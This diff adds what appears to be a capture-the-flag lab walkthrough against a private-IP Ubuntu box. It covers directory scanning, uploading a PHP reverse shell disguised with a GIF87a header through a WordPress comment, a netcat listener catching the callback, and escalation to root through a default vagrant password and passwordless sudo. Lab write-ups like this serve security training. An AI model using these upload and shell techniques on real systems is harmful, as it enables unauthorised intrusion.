@@ -1,0 +1,115 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://192.168.243.217/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Nov 16 23:17:37 2025
+URL_BASE: http://192.168.243.217/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.243.217/ ----
+==> DIRECTORY: http://192.168.243.217/assets/                                                                       
+==> DIRECTORY: http://192.168.243.217/css/                                                                          
+==> DIRECTORY: http://192.168.243.217/images/                                                                       
++ http://192.168.243.217/index.html (CODE:200|SIZE:46199)                                                           
+==> DIRECTORY: http://192.168.243.217/js/                                                                           
++ http://192.168.243.217/server-status (CODE:403|SIZE:280)                                                          
+                                                           
+
+
+
+wp site hidden inside, is hinted at bottom of page with "W3layouts"
+
+http://192.168.243.217/assets/fonts/blog/
+
+
+
+we comment on a post and are allowed to insert photos
+
+i add a GIF87a header to pentestmonkey php revshell
+
+upload and get an immediate callback
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [192.168.45.212] from (UNKNOWN) [192.168.243.217] 39134
+Linux ubuntu-xenial 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 04:45:48 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+www-data@ubuntu-xenial:/$ ls
+bin   data  etc   initrd.img	  lib	 lost+found  mnt  proc	run   snap  sys  usr	  var	   vmlinuz.old
+boot  dev   home  initrd.img.old  lib64  media	     opt  root	sbin  srv   tmp  vagrant  vmlinuz
+
+www-data@ubuntu-xenial:/$ cd /home
+www-data@ubuntu-xenial:/home$ ls
+james  ubuntu  vagrant
+www-data@ubuntu-xenial:/home$ 
+
+
+
+www-data@ubuntu-xenial:/opt$ ls -lsa
+total 12
+4 drwxr-xr-x  2 root root 4096 Jan 17  2021 .
+4 drwxr-xr-x 25 root root 4096 Feb 27  2025 ..
+4 -rw-r--r--  1 root root  104 Jan 17  2021 .creds
+www-data@ubuntu-xenial:/opt$ cat .creds
+';u22>'v$)='2a#B&>`c'=+C(?5(|)q**bAv2=+E5s'+|u&I'vDI(uAt&=+(|`yx')Av#>'v%?}:#=+)';y@%'5(2vA!'<y$&u"H!"ll
+www-data@ubuntu-xenial:/opt$ 
+
+unable to figure out what that is
+
+vagrant has a default password of vagrant
+
+www-data@ubuntu-xenial:/opt$ su vagrant
+Password: 
+vagrant@ubuntu-xenial:/opt$ sudo -l
+Matching Defaults entries for vagrant on ubuntu-xenial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User vagrant may run the following commands on ubuntu-xenial:
+    (ALL) NOPASSWD: ALL
+vagrant@ubuntu-xenial:/opt$ sudo /bin/bash -p
+root@ubuntu-xenial:/opt# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu-xenial:/opt# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
